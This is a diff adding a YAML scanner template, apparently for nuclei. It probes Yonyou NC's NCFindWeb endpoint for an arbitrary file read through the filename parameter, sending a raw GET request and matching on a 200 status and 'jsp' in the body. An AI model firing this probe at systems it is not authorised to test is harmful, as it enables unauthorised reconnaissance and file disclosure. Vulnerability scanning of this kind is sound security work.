@@ -1,0 +1,39 @@
+id: yongyouNCFindWeb-filename-read
+
+info:
+  name: WebFuzzer Template acVYLFlo
+  author: god
+  severity: high
+  description: 用友NC接口NCFindWeb参数filename存在任意文件读取漏洞
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /NCFindWeb?service=IPreAlertConfigService&filename= HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Cookie: JSESSIONID=99A602E1EEF8668C7EE42FC56E569763.server
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+    Upgrade-Insecure-Requests: 1
+    Accept-Language: zh-CN,zh;q=0.9
+    Cache-Control: max-age=0
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 'jsp'
+
+# Generated From WebFuzzer on 2024-09-12 10:46:16
